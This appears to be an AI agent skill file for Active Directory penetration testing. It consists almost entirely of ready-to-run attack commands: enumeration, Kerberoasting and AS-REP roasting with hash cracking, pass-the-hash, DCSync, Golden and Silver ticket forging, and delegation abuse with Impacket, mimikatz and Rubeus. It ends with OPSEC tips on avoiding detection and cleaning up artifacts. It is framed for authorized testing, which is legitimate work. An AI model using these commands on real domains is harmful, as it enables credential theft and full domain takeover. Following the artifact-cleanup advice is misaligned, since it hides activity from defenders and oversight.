---
name: ad-attacks
description: Active Directory attack paths, privilege escalation techniques, and domain takeover methods.
---

# Active Directory Attacks Skill

## When to Use
Use this skill for Active Directory security assessments during authorized penetration testing engagements.

## Enumeration

### BloodHound
```bash
# Collect
bloodhound-python -u <user> -p <pass> -d <domain> -dc <dc> -c All

# Analyze in GUI
bloodhound-python -u <user> -p <pass> -d <domain> -dc <dc> --dns-server <dc>
```

### LDAP Enumeration
```bash
# Users
ldapsearch -x -H ldap://<dc> -b "DC=domain,DC=com" "(objectClass=user)" sAMAccountName

# Groups
ldapsearch -x -H ldap://<dc> -b "DC=domain,DC=com" "(objectClass=group)" cn

# SPNs (Kerberoastable)
ldapsearch -x -H ldap://<dc> -b "DC=domain,DC=com" "(&(objectClass=user)(servicePrincipalName=*))" servicePrincipalName
```

## Attack Techniques

### Kerberoasting
```bash
# CrackMapExec
netexec ldap <dc> -u <user> -p <pass> --kerberoast output.txt

# Impacket
GetUserSPNs.py <domain>/<user>:<pass> -request

# Crack
hashcat -m 13100 output.txt /usr/share/wordlists/rockyou.txt
```

### AS-REP Roasting
```bash
# Kerbrute
kerbrute userenum --dc <dc> -d <domain> users.txt

# Impacket
GetNPUsers.py <domain>/ -usersfile users.txt -format hashcat -outputfile asrep.txt

# Crack
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### Pass the Hash
```bash
# CrackMapExec
netexec smb <target> -u <user> -H <ntlm_hash>

# Impacket
psexec.py -hashes :<ntlm_hash> <domain>/<user>@<target>
wmiexec.py -hashes :<ntlm_hash> <domain>/<user>@<target>
```

### DCSync
```bash
# Impacket
secretsdump.py <domain>/<user>:<pass>@<dc>

# Mimikatz
mimikatz.exe "lsadump::dcsync" /user:krbtgt "exit"
```

### Golden Ticket
```bash
# Mimikatz
mimikatz.exe "kerberos::golden /user:<user> /domain:<domain> /sid:<sid> /krbtgt:<hash> /ptt" "exit"

# Impacket
ticketer.py -nthash <krbtgt_hash> -domain-sid <sid> -domain <domain> <user>
export KRB5CCNAME=<user>.ccache
```

### Silver Ticket
```bash
# Impacket
ticketer.py -nthash <service_hash> -domain-sid <sid> -domain <domain> -spn <spn> <user>
```

### Unconstrained Delegation
```bash
# Rubeus
Rubeus.exe monitor /interval:5 /nowrap

# Capture TGT
Rubeus.exe harvest /interval:30
```

### Constrained Delegation
```bash
# Impacket
getST.py -spn <spn> -impersonate <target_user> <domain>/<user>:<pass>
```

## Privilege Escalation Paths

### Local Admin
```
User → Local Admin → Domain Admin
```

### Kerberoastable Accounts
```
User with SPN → Kerberoast → Crack → Service Account → Domain Admin
```

### ACL Abuse
```
User with GenericAll → Reset Password → Domain Admin
```

## Detection Indicators
- 4769: Kerberos service ticket operations
- 4770: Service ticket renewal
- 4624: Logon Type 3
- 4720: User account created

## OPSEC Guidelines
1. Use legitimate tools when possible
2. Limit authentication attempts
3. Use encrypted channels
4. Monitor for detection
5. Clean up artifacts
